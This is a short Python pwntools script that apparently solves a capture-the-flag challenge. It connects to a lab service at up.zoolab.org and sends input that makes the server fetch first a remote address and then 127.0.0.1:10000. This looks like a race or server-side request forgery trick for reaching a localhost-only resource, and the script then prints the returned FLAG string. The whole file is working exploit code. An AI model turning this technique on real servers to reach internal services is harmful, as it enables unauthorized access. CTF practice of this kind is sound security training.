#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

if __name__ == "__main__":
    
    r = remote('up.zoolab.org', 10932)
    r.recvuntil('What do you want to do?'.encode())

    payload = 'g\nup.zoolab.org/10000\ng\n127.0.0.1/10000\n'
    r.send(payload.encode())

    time.sleep(0.5)
    
    r.sendline(b'v')
    recv = r.recvuntil(b'}')
    
    r.close();

    print(recv[recv.find(b'FLAG{'):].decode())
